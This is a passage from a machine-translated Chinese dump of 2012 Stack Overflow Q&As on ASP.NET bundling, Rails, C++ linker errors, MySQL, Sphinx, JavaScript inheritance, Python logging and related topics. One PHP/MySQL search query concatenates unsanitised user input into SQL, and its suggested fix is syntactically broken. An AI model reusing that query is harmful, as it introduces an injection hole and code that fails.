just keep adding your script path in `.Include()` for every javascript in the view and keep doing `bundles.add(new ScriptBundle(<bundle path>))` for every view you have.

you will do the similar steps with CSS bundles, but instead of using `ScripBundle` you will use `StyleBundle`

To lessen the repetition of codes try creating a list of strings for every javascripts that are dependent to one another and do a union on them:

```
List<string> jqGridScripts = new List<string>
                             {"~/Static/Scripts/jquery.jqGrid.src.js"
                             , "~/Static/Scripts/i18n/grid.locale-en.js"
                             , "~/Static/Scripts/helper.jqgrid.js"};
List<string> jqStopwatch = new List<string> 
                             { "~/Static/Scripts/jquery.stopwatch.js" };

bundles.Add(new ScriptBundle("~/bundles/viewName")
                             .Include(jqGridScripts
                                     .Union(jqStopwatch).ToArray())); 
```

Just remember that the order in which they appear on the array is the same order in which they will appear on the HTML or be bundled and minified.

**Code in View:**

```
@section scripts{
    @Scripts.Render("~/bundles/viewName");
} 
```

**Resultant Code in HTML**

```
<script src="/WDCSS/bundles/viewName?v=T3IlBuvfGTiz62pwDuiPogFX1jQoxVC2tmp3K6wffBQ1"></script> 
```

**My Opinion**

I don't really know if we should do this or not. For me I separate scripts that are used in all pages in a separate bundle so that it would be cached. and then create another bundle for the scripts used in a view. What I am trying to say is that we should achieve a balance between bundling, minification, and caching.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T03:52:01.273

更具体地回答您的问题。向我们展示您的尝试。您必须手动创建每个捆绑包。如果您希望在特定视图上使用捆绑包，请创建这样的捆绑包并在视图中指定您将在那里使用该捆绑包，就像您在视图中指定您将在那里使用 css 文件一样。

# ruby-on-rails - 在 Rails 中构建自定义 ajax 表单时，发送到控制器以使其响应 Json 的正确数据是什么？

> ID：14097032
> 
> 赞同：0
> 
> 时间：2012-12-31T03:13:51.560
> 
> 标签：ruby-on-rails, ajax, ruby-on-rails-3

我想构建一个自定义 ajax 表单（对使用 Rails 开箱即用的解决方案不感兴趣）：

```
 $('form.ajaxForm').submit(function(e){
        e.preventDefault();
        var $form = $(this),
          formValues = getFormValues($form),
          formUrl = $form.attr('action');

        $.post(formUrl, {
          data : formValues,
          contentType: "application/json",
          success : function(data, textStatus, jqXHR){
             // do success here
          }
        });
      });

var getFormValues = function($form){
    var values = {};
    var valuesArray = $form.serializeArray();
    for(var i = 0, max = valuesArray.length; i < max; i++){
      var value = valuesArray[i];
      values[value.name] = value.value
    };
    return values;
  }; 
```

我确实想使用 Rails 3 在收到 json 请求时做出不同响应的能力，例如：

```
def create
    @registration = Registration.new(params[:registration])

    respond_to do |format|
      format.html { render action: "new" }
      format.json { render json: @registration.errors, status: :unprocessable_entity }
    end
  end 
```

由于某种原因，Rails 在发布期间无法处理我的请求，并且不响应 json。http 标头中的内容告诉它响应 json，以及发布此数据的正确方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T07:03:01.987

查看[Rails API 文档](http://api.rubyonrails.org/classes/ActionController/MimeResponds.html#method-i-respond_to)，我发现了这个花絮：

> Rails 根据客户端提交的 HTTP Accept 标头确定所需的响应格式。

jQuery 的`$.ajax`调用有一个`accepts`设置，可用于设置此标头的值，但我相信 using`dataType`会自动为您配置。

# c++ - VS 2010 C++ LNK2005 错误同时使用 #pragma once 和 #ifndef

> ID：14097033
> 
> 赞同：3
> 
> 时间：2012-12-31T03:13:51.957
> 
> 标签：c++, lnk2005

```
1>Deck.obj : error LNK2005: "class Card card" (?card@@3VCard@@A) already defined in Card.obj
1>PokerTester.obj : error LNK2005: "class Card card" (?card@@3VCard@@A) already defined in Card.obj
1>PokerTester.obj : error LNK2005: "class Deck deck" (?deck@@3VDeck@@A) already defined in Deck.obj
1>C:\Dev\Poker\Debug\Poker.exe : fatal error LNK1169: one or more multiply defined symbols found 
```

我通过谷歌搜索了解了为什么会出现这些错误，但我不知道为什么当我尝试过 #pragma 一次和 #ifndef 保护时它们仍然会发生。

这是我的卡片.h

```
#pragma once

#ifndef CARD_H
#define CARD_H

#include <iostream>
#include <string>
using namespace std;

class Card
{
public:
    Card(int cardSuit = 0, int cardValue = 2); //constructor will create a two of hearts by default
    ~Card(void);
    int getSuit(); //returns the suit of the Card
    int getValue(); //returns the value of the Card
    int getColor(); //returns the color of the Card
    friend ostream& operator<< (ostream &out, Card &cCard);

private:
    int suit; //card suit
    int value; //card value
    int color; //card color
} card;

#endif 
```

还有我的 Deck.h

```
#pragma once

#ifndef DECK_H
#define DECK_H

#include "Card.h"
#include <vector>
using namespace std;

class Deck
{
public:
     Deck(void);
    ~Deck(void);
    void newDeck(); //regenerates the full 52 card deck (e.g. cards are missing)
    void shuffle(); //shuffles the deck
    int cardsInDeck(); //returns the number of cards remaining in the deck
    Card takeTopCard(); //returns the top card and removes it from the deck
private:
    vector<Card> myDeck; //vector of 52 Card objects that make up the deck
} deck;

#endif 
```

这可能很明显，但我无法弄清楚......

根据要求，这里是 Card.cpp：

```
#include "Card.h"

Card::Card(int cardSuit, int cardValue)
{
card.suit = cardSuit;
card.value = cardValue;
if(cardSuit == 0 || cardSuit == 1) card.color = 0;
if(cardSuit == 2 || cardSuit == 3) card.color = 1;
}

//returns the card's color
int Card::getColor() 
{
return card.color;
}

//returns the card's suit
int Card::getSuit()
{
return card.suit;
}

//returns the card's value
int Card::getValue()
{
return card.value;
} 
```

这是我为测试它们而写的东西：

```
#include "Deck.h"

int main() 
{
Deck testDeck = *new Deck();
Card testCardCreation = *new Card();
Card testCard = testDeck.takeTopCard();
testDeck.shuffle();
Card testShuf = testDeck.takeTopCard();
cout << testCard << endl << testShuf << endl;

return 0;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-31T03:19:05.497

对象`card`和`deck`在标题中定义。当您将标题包含到翻译单元中时，它将创建该对象的另一个定义。您可能应该从类定义中删除`card`and 。`deck`如果您确实需要定义这些对象，则可以使用

```
extern Card card; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-31T03:18:10.373

它们是链接器错误，它们与 C++ 代码本身无关。

问题出现在 Card 和 Deck 定义的末尾。为什么你有：

```
} card; 
```

和：

```
} deck; 
```

?

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T03:18:21.780

1) 如果你多次定义“class Card”，你会得到一个*编译*错误，而不是链接错误。

2）在大多数情况下，您的头文件看起来不错。事实上，您并不真的需要两者：#pragma once 或 #ifndef 中的一个或另一个就足够了。

3）问题：从你的类定义中去掉最后的“卡片”和“套牌”！

# mysql - SQL - 返回每行列的最小值

> ID：14097036
> 
> 赞同：1
> 
> 时间：2012-12-31T03:14:47.583
> 
> 标签：mysql, sql, hive, min

我需要为 SQL 表中的每一行选择 3 列的最小值。该表是数千行。我正在使用 MySQL。

```
User   val1    val2    val3
1      1       2       5 
2      3       3       3
3      0       1       0 
```

退货

```
User    minimum_value
1       1
2       3
3       0 
```

每次搜索都会向我显示 MIN() 函数，该函数用于查找所有行上整列的最小值。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T03:22:56.047

也许你可以使用[`least`函数](http://dev.mysql.com/doc/refman/5.0/en/comparison-operators.html#function_least)：

```
select least(val1, val2, val3) from your_table; 
```

# c++ - boost_asio/example/ssl/client.cpp 的未解析符号

> ID：14097037
> 
> 赞同：2
> 
> 时间：2012-12-31T03:14:51.593
> 
> 标签：c++, windows, visual-studio-2010, boost, openssl

> **可能重复：**
> [boost::asio ssl 链接错误](https://stackoverflow.com/questions/9805013/boostasio-ssl-linking-error)

我遇到了未定义符号的问题。我的 boost 安装很好，因为我已经将它用于其他项目。我知道我需要安装 OpenSSL，所以按以下方式安装它。

然后，我使用 VS2010 命令提示符运行以下命令，并将提取的 OpenSSL 源（最新来自 openssl 站点）作为工作目录。

```
perl Configure VC-WIN64A no-shared no-idea // I don't trust this.

ms\do_win64a

nmake -f ms\ntdll.mak
nmake -f ms\ntdll.mak install

nmake -f ms\nt.mak
nmake -f ms\nt.mak install 
```

源文件只是 boost 示例。[http://www.boost.org/doc/libs/1_52_0/doc/html/boost_asio/example/ssl/client.cpp](http://www.boost.org/doc/libs/1_52_0/doc/html/boost_asio/example/ssl/client.cpp)

我的 VS2010 项目设置如下。

C/C++ > 常规 > 添加包含目录

```
E:\libraries\boost_1_49_0   //as used in past projects 
E:\usr\local\ssl\include    //just installed 
```

链接器 > 常规 > 添加库目录

```
E:\libraries\boost_1_49_0\stage\lib
E:\usr\local\ssl\lib 
```

链接器 > 输入 > 添加目录

```
libeay32.lib 
```

我想它可能一定是提振跳闸了。所以我尝试了一个 SSL[加密](http://www.askyb.com/cpp/using-openssl-cryptography-blowfish-des-rc2-rc4/)示例，其中包含未定义的符号。

[文本文件](https://dl.dropbox.com/u/15586644/boostssltcpconnectionerrors.txt)中的错误

操作系统是 Windows 7 64 位

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T03:58:13.000

我试图用 64 位库构建一个 32 位程序。

我从上面更改了以下内容以构建 64 位版本

perl 配置VC-WIN64A no-asm --prefix=\Dir\for\64\bit\ssl -DUNICODE -D_UNICODE

ms\do_win64a.bat

然后正常的nmake

# sql - count() 来自不同表的 where 子句

> ID：14097043
> 
> 赞同：1
> 
> 时间：2012-12-31T03:15:44.880
> 
> 标签：sql

我有一个搜索功能，可以根据输入来搜索 mysql 结果。现在我想在`where`子句中包含来自不同表的结果的点赞数（）。

比如这个场景。`I want to search "Dog" where count(like_id) >= 1.`

我想要包含的 Likes 表是：`TABLE_GLOBAL_LIKES`.

的结构`TABLE_GLOBAL_LIKES`是： 字段：`like_id`, `user_id`, `products_id`, `blog_id`.

BOTH`TABLE_GLOBAL_PRODUCTS`和`TABLE_GLOBAL_LIKES`有一个共同的领域`products_id`和`blog_id`关联。

这是我希望包含 Likes 表的工作查询。

```
SELECT SQL_CALC_FOUND_ROWS p.*,
       CASE
           WHEN p.specials_new_products_price > 0.0000
                AND (p.expires_date > Now()
                     OR p.expires_date IS NULL
                     OR p.expires_date ='0000-00-00 00:00:00')
                AND p.status != 0 THEN p.specials_new_products_price
           ELSE p.products_price
       END price
FROM ".TABLE_GLOBAL_PRODUCTS." p
INNER JOIN ".TABLE_STORES." s ON s.blog_id = p.blog_id
WHERE MATCH (p.products_name,
             p.products_description) AGAINST ('*".$search_key."*')
  AND p.display_product = '1'
  AND p.products_status = '1' HAVING price <= ".$priceto_key."
  AND price >= ".$pricefrom_key."
ORDER BY p.products_date_added DESC, p.products_name 
```

我是 mysql 查询的新手。请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T03:30:57.953

尝试这个：

```
SELECT SQL_CALC_FOUND_ROWS p.*, COUNT(l.like_id)
       CASE
           WHEN p.specials_new_products_price > 0.0000
                AND (p.expires_date > Now()
                     OR p.expires_date IS NULL
                     OR p.expires_date ='0000-00-00 00:00:00')
                AND p.status != 0 THEN p.specials_new_products_price
           ELSE p.products_price
       END price
FROM ".TABLE_GLOBAL_PRODUCTS." p
INNER JOIN ".TABLE_STORES." s ON s.blog_id = p.blog_id
INNER JOIN ".TABLE_GLOBAL_LIKES." l ON l.blog_id = p.blog_id AND l.products_id = p.products_id
WHERE MATCH (p.products_name,
             p.products_description) AGAINST ('*".$search_key."*')
  AND p.display_product = '1'
  AND p.products_status = '1' HAVING price <= ".$priceto_key."
  AND price >= ".$pricefrom_key."
GROUP BY p.products_id
HAVING COUNT(l.like_id)>0
ORDER BY p.products_date_added DESC, p.products_name 
```

# sphinx - 狮身人面像 SetSortMode EXPR

> ID：14097046
> 
> 赞同：0
> 
> 时间：2012-12-31T03:16:33.133
> 
> 标签：sphinx

我正在尝试使用 Sphinx (PHP) 进行排序以按价格顺序显示，但是当我这样做时，它会在 1.75 英镑之前显示 10 英镑，所以我需要像在 mySQL 中一样使用 ABS。

我试过这个：

$s->SetSortMode (SPH_SORT_EXPR, "ABS(display_price) ASC" );

它似乎不起作用。

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-03T23:06:41.380

检查是否 display_price 属性在搜索索引中被视为小数

可能你有

> sql_attr_string = display_price

代替

> sql_attr_float = display_price

或者

> sql_attr_bigint = display_price

*   更新

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T15:48:07.800

SPH_SORT_EXPR 总是降序排列。ASC/DESC 仅用于 EXTENDED 模式。

要将其“反转”为升序，可以将其构建到表达式中。

```
$s->SetSortMode (SPH_SORT_EXPR, "1000000-CEIL(ABS(display_price*100.0))" ); 
```

# javascript - JavaScript 命名空间和继承

> ID：14097048
> 
> 赞同：1
> 
> 时间：2012-12-31T03:17:08.023
> 
> 标签：javascript, prototypal-inheritance

我在 jsFiddle 中有一些代码：http: [//jsfiddle.net/xyuY6/](http://jsfiddle.net/xyuY6/)

和代码：

```
var App= {};

App.WebPage = {
 WebPage : function(name) {
     alert("In Super");
     this.name = name;  
 },

 Home : function(name) {
      alert("In Sub");
      App.WebPage.WebPage.call(this, name);
 }

};

App.WebPage.WebPage.prototype.sayName = function() {
alert(this.name);
};

inherit(App.WebPage.WebPage, App.WebPage.Home);

var x = new App.WebPage.Home("zack");
x.sayName();

function inherit(subType, superType) {
    alert("IN HERE");
    var p = Object.create(superType);
    p.constructor = subType;
    subType.prototype = p;
} 
```

我想要做的是`App`在这个命名空间中创建一个包含两个构造函数的命名空间，`WebPage`并且`Home`. `WebPage`是“超类型”并且`Home`是“子类型”。Home 应该继承 WebPage 的所有内容。

但是，正如您在运行 JavaScript 时会看到的那样，问题是 WebPage 原型上定义的 sayName 函数在我这样做时没有被调用`x.sayName`。因此，它不会被继承。

为什么？

谢谢您的帮助！！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T03:31:31.997

似乎您在某些时候混淆了超类和子类（在调用或`inherit`定义中）......

这是固定代码（如果我了解您要执行的操作）：http: [//jsfiddle.net/45uLT/](http://jsfiddle.net/45uLT/)

```
var App= {};

App.WebPage = {
     WebPage : function(name) {
         alert("In Super");
         this.name = name;  
     },

     Home : function(name) {
          alert("In Sub");
          App.WebPage.WebPage.call(this, name);
     }

};

App.WebPage.WebPage.prototype.sayName = function() {
    alert(this.name);
};

inherit(App.WebPage.WebPage, App.WebPage.Home);

var x = new App.WebPage.Home("zack");
x.sayName();

function inherit(superType, subType) {
    alert("IN HERE");
    var p = new superType;
    subType.prototype = p;
    subType.prototype.constructor = subType;
} 
```

希望这是你想要的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T03:38:54.943

这是 jsfiddle 中的一个工作示例，基于您在上面尝试执行的操作：

[http://jsfiddle.net/8GwRd/](http://jsfiddle.net/8GwRd/)

```
var App = (function() {
    function WebPage(name) {
        this.type = 'WebPage';
        this.name = name;
    }

    WebPage.prototype.sayName = function() {
      alert(this.name + ' is a ' + this.type);
    };

    function Home(name) {
        WebPage.call(this, name);
        this.type = 'Home'
    }

    Home.prototype = new WebPage();

    return {
        WebPage: WebPage,
        Home: Home
    };       

})();

var y = new App.WebPage('bob');
y.sayName();

var x = new App.Home("zack");
x.sayName(); 
```

# actionscript-3 - 羽毛 UI 自定义 itemRenderer 纹理

> ID：14097054
> 
> 赞同：0
> 
> 时间：2012-12-31T03:18:13.900
> 
> 标签：actionscript-3, starling-framework

我想知道是否有人知道（并愿意分享）如何在自定义 itemRenderer 中使用纹理？

基本上，我希望能够展示如下内容：

```
X    X    Item name 1     Item detail 1     X
X    X    Item name 2     Item detail 2     X
X    X    Item name 3     Item detail 3     X
X    X    Item name 4     Item detail 4     X 
```

其中 X 是图像/纹理。

我已经在我的主类文件中尝试过

```
itemListArray.push({image1: Assets.getAtlas().getTexture("texture-name-1"), image2: Assets.getAtlas().getTexture("texture-name-1"), label1: "Item name 1", label2: "Item detail 1", image3: Assets.getAtlas().getTexture("texture-name-3")}); 
```

并且还尝试将纹理直接添加到自定义项目渲染器类中，但我无法显示它。我确信这可能是在项目渲染器中使用图像/图标的错误方法。

干杯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T08:16:20.973

解决了。在实际项目渲染器中添加资产并创建一个布尔值以在项目渲染器上显示/隐藏。

# google-chrome-extension - Chrome 扩展 2 个问题

> ID：14097057
> 
> 赞同：0
> 
> 时间：2012-12-31T03:18:37.440
> 
> 标签：google-chrome-extension

我已经管理了我的扩展程序并在内容脚本中使用 ajax 调用来调用我的服务器并得到答复。但在控制台中，我收到如下消息：

**[https://www.injectedpage.com](https://www.injectedpage.com)上的页面显示来自[http://www.mywebsite.com/Script.asp](http://www.mywebsite.com/Script.asp)的不安全内容**

我可以做些什么来防止出现此消息吗？

请再问一个问题。如果我将 .crx 分发给其他人，他们可以在 .js 页面中看到我的代码吗？我不希望他们知道我将发送的数据发布到服务器的哪个页面。

谢谢你读我。还有你对我的耐心。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T03:25:30.533

第一个问题是由于您注入代码的网站是 https 而您的页面是 http。这是来自 Chrome 的安全警告，您无法隐藏。

是的，他们可以看到您的扩展程序的完整代码。你可以混淆它，但是当你发布你的扩展时，你会给用户完整的代码。

如果您的扩展从工具栏中弹出一个东西，右键单击以检查元素，如果它有背景页面或其他东西，您可以从扩展页面检查它（必须检查开发人员模式）

要查看每个扩展程序的所有文件，用户可以导航到 Chrome 的扩展程序目录。例如，在 Win7 上是

```
C:\Users\[username]\AppData\Local\Google\Chrome\User Data\Default\Extensions 
```

用户也可以将您的 crx 重命名为 zip 和提取。

# python - 启用详细日志记录的更简单方法

> ID：14097061
> 
> 赞同：82
> 
> 时间：2012-12-31T03:19:20.393
> 
> 标签：python, python-2.7

`--verbose`如果我从命令行启用并且脚本中有以下内容，我想添加一个调试打印语句测试。

```
logger.info("test") 
```

我经历了以下问题，但无法得到答案......

*   [如何在脚本中实现 --verbose 或 -v 选项？](https://stackoverflow.com/questions/5980042/how-to-implement-the-verbose-or-v-option-into-a-python-script)

*   [Python 日志记录 - DEBUG 下面有什么东西吗？](https://stackoverflow.com/questions/9042919/python-logging-is-there-something-below-debug)

* * *

## 回答 #1

> 赞同：140
> 
> 时间：2013-12-18T16:11:21.847

我发现`--verbose`（对于用户）和`--debug`（对于开发人员）都很有用。以下是我使用`logging`and的方法`argparse`：

```
import argparse
import logging

parser = argparse.ArgumentParser()
parser.add_argument(
    '-d', '--debug',
    help="Print lots of debugging statements",
    action="store_const", dest="loglevel", const=logging.DEBUG,
    default=logging.WARNING,
)
parser.add_argument(
    '-v', '--verbose',
    help="Be verbose",
    action="store_const", dest="loglevel", const=logging.INFO,
)
args = parser.parse_args()    
logging.basicConfig(level=args.loglevel) 
```

因此，如果`--debug`设置了，则日志记录级别设置为`DEBUG`. 如果`--verbose`，日志记录设置为`INFO`。如果两者都没有，则缺少`--debug`将日志记录级别设置为默认值`WARNING`。

* * *

## 回答 #2

> 赞同：95
> 
> 时间：2012-12-31T06:31:14.480

您需要将[Argparse 教程](http://docs.python.org/2/howto/argparse.html)的智慧与[Python 的 Logging HOWTO](http://docs.python.org/2/howto/logging.html)结合起来。这是一个例子......

```
> cat verbose.py 
#!/usr/bin/env python

import argparse
import logging

parser = argparse.ArgumentParser(
    description='A test script for http://stackoverflow.com/q/14097061/78845'
)
parser.add_argument("-v", "--verbose", help="increase output verbosity",
                    action="store_true")

args = parser.parse_args()
if args.verbose:
    logging.basicConfig(level=logging.DEBUG)

logging.debug('Only shown in debug mode') 
```

运行帮助：

```
> ./verbose.py -h
usage: verbose.py [-h] [-v]

A test script for http://stackoverflow.com/q/14097061/78845

optional arguments:
  -h, --help     show this help message and exit
  -v, --verbose  increase output verbosity 
```

以详细模式运行：

```
> ./verbose.py -v
DEBUG:root:Only shown in debug mode 
```

默默运行：

```
> ./verbose.py   
> 
```

* * *

## 回答 #3

> 赞同：68
> 
> 时间：2015-02-19T16:42:19.623

这是一个更简洁的方法，它进行边界检查，并将在帮助中列出有效值：

```
parser = argparse.ArgumentParser(description='This is a demo.')
parser.add_argument("-l", "--log", dest="logLevel", choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'], help="Set the logging level")

args = parser.parse_args()
if args.logLevel:
    logging.basicConfig(level=getattr(logging, args.logLevel)) 
```

用法：

```
demo.py --log DEBUG 
```

* * *

## 回答 #4

> 赞同：32
> 
> 时间：2015-12-03T12:12:04.590

另一种变体是计算数量`-v`并将计数用作 a 的索引，`list`实际水平来自`logging`：

```
import argparse
import logging

parser = argparse.ArgumentParser()
parser.add_argument('-v', '--verbose', action='count', default=0)
args = parser.parse_args()

levels = [logging.WARNING, logging.INFO, logging.DEBUG]
level = levels[min(len(levels)-1,args.verbose)]  # capped to number of levels

logging.basicConfig(level=level,
                    format="%(asctime)s %(levelname)s %(message)s")

logging.debug("a debug message")
logging.info("a info message")
logging.warning("a warning message") 
```

这适用于`-vvvv`, `-vvv`, `-vv`, `-v`, `-v -v`, 等，如果没有，如果提供更多，则`-v`选择然后`logging.WARNING``-v``INFO``DEBUG`

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2014-02-24T07:11:14.690

`-v`您可以在标志之后将级别明确指定为整数：

```
parser = argparse.ArgumentParser()
parser.add_argument("-v", "--verbose", const=1, default=0, type=int, nargs="?",
                    help="increase verbosity: 0 = only warnings, 1 = info, 2 = debug. No number means info. Default is no verbosity.")
args = parser.parse_args()

logger = logging.getLogger()
if args.verbose == 0:
    logger.setLevel(logging.WARN) 
elif args.verbose == 1:
    logger.setLevel(logging.INFO) 
elif args.verbose == 2:
    logger.setLevel(logging.DEBUG) 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2015-04-01T23:54:32.280

如果您想为不想（或不能）编辑的脚本启用 logging.DEBUG 级别，您可以自定义启动：

```
jcomeau@aspire:~$ python -c "import site; site._script()"
[snip]...
USER_BASE: '/home/jcomeau/.local' (exists)
USER_SITE: '/home/jcomeau/.local/lib/python2.7/site-packages' (exists)
ENABLE_USER_SITE: True
jcomeau@aspire:~$ mkdir -p ~/.local/lib/python2.7/site-packages
jcomeau@aspire:~$ vi ~/.local/lib/python2.7/site-packages/usercustomize.py 
```

输入以下内容：

```
import os, logging
if os.getenv('DEBUGGING'):
    logging.basicConfig(level = logging.DEBUG) 
```

那么你可以：

```
jcomeau@aspire:~$ mkdir -p /tmp/some/random/
jcomeau@aspire:~$ echo 'import logging; logging.debug("test")' >> /tmp/some/random/script.py
jcomeau@aspire:~$ DEBUGGING=1 python /tmp/some/random/script.py 
DEBUG:root:test 
```

来自 Paul Ollis 在[http://nedbatchelder.com/blog/201001/running_code_at_python_startup.html](http://nedbatchelder.com/blog/201001/running_code_at_python_startup.html)

* * *

2017-07-18：我已经改用另一种方法：

```
logging.basicConfig(level=logging.DEBUG if __debug__ else logging.INFO) 
```

它的作用是，如果您在没有优化的情况下运行（如 中`python script.py`），您将获得 DEBUG 级别的内容，而如果您在运行时`python -OO script.py`则没有。没有要设置的环境变量。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2016-06-22T12:40:53.367

这是另一个让 argparse 计算 -v 选项的方法，以将详细程度从默认的 WARNING 到 INFO (-v) 到 DEBUG (-vv) 增加两个级别。这不映射到定义的常量，`logging`而是直接计算值，限制输入：

```
print( "Verbosity / loglevel:", args.v )
logging.basicConfig( level=10*(3-max(0,min(args.v,3))) )
logging.debug("debug") # 10
logging.info("info") # 20
logging.warning("warning") # 30 - The default level is WARNING, which means that only events of this level and above will be tracked
logging.error("error") # 40
logging.critical("critical") # 50 
```

# mysql - mysql在同一张表上获得两个总和的差

> ID：14097062
> 
> 赞同：3
> 
> 时间：2012-12-31T03:19:45.383
> 
> 标签：mysql, sql, sum

我怎样才能在一个查询而不是这个查询中得到结果：

```
SELECT SUM(`quantity`) as type0 FROM `fruits_delivery` 
    WHERE `fid`='1001' AND `type`=0; 
```

> 结果_1 = type0 ;

```
SELECT SUM(`quantity`) as type1 FROM `fruits_delivery`  
    WHERE `fid`='1001' AND `type`=1; 
```

> 结果_2 = type1；
> 
> final_result = result_1 - result_2；

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-31T03:24:46.590

你应该使用这个

```
SELECT sum(IF(`type`=0, `quantity`, 0))-sum(IF(`type`=1, `quantity`, 0)) 
        AS    `final_result` 
        FROM   `fruits_delivery` 
        WHERE  `fid` = '1001' 
```

[sqlfiddle](http://sqlfiddle.com/#!2/f1b1b/7/0)

* * *

### 旧答案

```
SELECT T1.result - T2.result AS `final_result` 
FROM   (SELECT Sum(`quantity`) AS result, 
               `fid` 
        FROM   `fruits_delivery` 
        WHERE  `fid` = '1001' 
               AND `type` = 0 
        LIMIT  1) AS T1 
       JOIN (SELECT Sum(`quantity`) AS result, 
                    `fid` 
             FROM   `fruits_delivery` 
             WHERE  `fid` = '1001' 
                    AND `type` = 1 
             LIMIT  1) AS T2 
         ON ( T1.fid = T2.fid ) 
```

[SQLFiddle](http://sqlfiddle.com/#!2/f1b1b/2/0)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-12-31T03:31:57.480

或者，您也可以使用`CASE`

```
SELECT  SUM(CASE WHEN type = 0 THEN quantity ELSE 0 END) -
        SUM(CASE WHEN type = 1 THEN quantity ELSE 0 END)
          AS final_result
FROM    fruits_delivery
WHERE   fid = '1001' 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!2/841bb/1)

# multithreading - springmvc 中的@Autowired HttpSession 线程安全吗？

> ID：14097069
> 
> 赞同：2
> 
> 时间：2012-12-31T03:20:38.470
> 
> 标签：multithreading, spring, thread-safety, httpsession

我正在使用`HttpSession`对象：`Spring MVC``@Autowired`

```
public abstract class UserController {
    @Autowired
    public HttpSession session;

    @RequestMapping(value = { "" }, method = { RequestMethod.GET })
    public ModelAndView index(){
        User user=(User)session.getAttribute("loginUser");
    }
} 
```

会话线程安全吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T03:27:19.483

你从 Spring 中得到的只是 HttpSession。没有特殊的线程安全保证。

使用 HttpSession 的实现不一定是线程安全的。另请参阅此问题：[Is HttpSession thread safe, are set/get Attribute thread safe operations？](https://stackoverflow.com/questions/616601/is-httpsession-thread-safe-are-set-get-attribute-thread-safe-operations)

您可以通过以下方式减少竞争条件导致没有同步问题的机会：

*   减少会话不会同时处理两个请求的机会
*   不与请求线程以外的另一个线程混淆会话

如果您需要异步处理会话中的数据，我发现在请求线程中从会话中提取不可变对象然后在服务器上的异步进程中使用这些对象是一种更好的策略。这样你就可以尽可能地避免从会话中访问。也就是说，如果您需要完全安全（为什么要冒险），您需要同步。

```
synchronized(mutexFor(session)) {
  final String data = session.getAttribute("data");
  //do some work
  session.setAttribute("data", newValue);
} 
```

# ruby-on-rails - 使用 Devise 和 Heroku 在 Rails 3 中没有方法错误

> ID：14097070
> 
> 赞同：1
> 
> 时间：2012-12-31T03:20:50.407
> 
> 标签：ruby-on-rails, ruby-on-rails-3, heroku, devise

我部署到 Heroku 的 Rails 应用程序有问题。当我在我的俱乐部资源上发帖时，它说：

```
Parameters: {"utf8"=>"✓","authenticity_token"=>"MqScpac6l9MMHdPBehqfq0mTwLCCZq2dlZLVY6wt+ow=", 
"club"=>    {"name"=>"Grün Weiß Club im PSV Kiel"}, "commit"=>"absenden"}
2012-12-31T03:10:49+00:00 app[web.1]: NoMethodError (undefined method `user_id=' for #  <Club:0x000000061269b0>):
2012-12-31T03:10:49+00:00 app[web.1]: 
2012-12-31T03:10:49+00:00 app[web.1]: 
2012-12-31T03:10:49+00:00 app[web.1]:   app/controllers/clubs_controller.rb:47:in `create' 
```

我的模型如下所示：

```
class Club < ActiveRecord::Base
  default_scope :order => 'name ASC'
  attr_accessible :name, :user_id
  belongs_to :user
  has_many :memberships
  has_many :users, :through => :memberships, :order => 'name ASC'
  validates :name, presence: true, :uniqueness => true
end 
```

控制器创建如下操作：

```
def create
  @club = Club.new(params[:club])
  @club.user_id = current_user.id
  respond_to do |format|
    if @club.save
      format.html { redirect_to @club, notice: 'Club was successfully created.' }
      format.json { render json: @club, status: :created, location: @club }
    else
      format.html { render action: "new" }
      format.json { render json: @club.errors, status: :unprocessable_entity }
    end
  end
end 
```

身份验证由 Devise gem 完成。另外让我感到困惑的是，如果我在 heroku 上运行 rails 控制台，它会说：

```
irb(main):001:0> Club
=> Club(id: integer, name: string, created_at: datetime, updated_at: datetime, user_id: integer) 
```

所以即使是数据库也应该是正确的。谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T06:41:21.493

在控制器中试试这个，看看它是否有效：

```
@club = current_user.clubs.build params[:club] 
```

代替

```
@club = Club.new(params[:club])
@club.user_id = current_user.id 
```

确保`User`包含`has_many :clubs`，然后你可以摆脱`attr_accessible :user_id`

# google-app-engine - NetworkError：在Firefox上找不到404

> ID：14097071
> 
> 赞同：1
> 
> 时间：2012-12-31T03:20:55.623
> 
> 标签：google-app-engine, gwt

我们在 gae for java 上部署了一个 gwt 应用程序。该应用程序在 google chrome 中运行良好，但在 ie 和 firefox 上出现以下异常

网络错误：404 未找到 - [http://www.sakshum.org/adminmodule/67883654A8944A4C561CF25763FB1D79.cache.html](http://www.sakshum.org/adminmodule/67883654A8944A4C561CF25763FB1D79.cache.html)

基于 [使用 SVN 和 Eclipse 正确设置 GWT 项目，](https://stackoverflow.com/questions/5663465/setup-a-gwt-project-correctly-with-svn-and-eclipse)我们已经排除了 adminmodule 目录中的文件以上传到应用程序引擎。

请告知它失败的原因以及如何使其工作。

被忽略的模式是：

```
.svn
*.bak
classes/
thumbs.db
*.class
.gwt*
gwt-unitCache/
deploy/
war/adminmodule/
war/sakshumwebgae/
sakshumweb/war/WEB-INF/deploy/adminmodule/
sakshumweb/war/sakshumwebgae/
.bin
*.orig 
```

* * *

## 回答 #1

> 赞同：1
> 
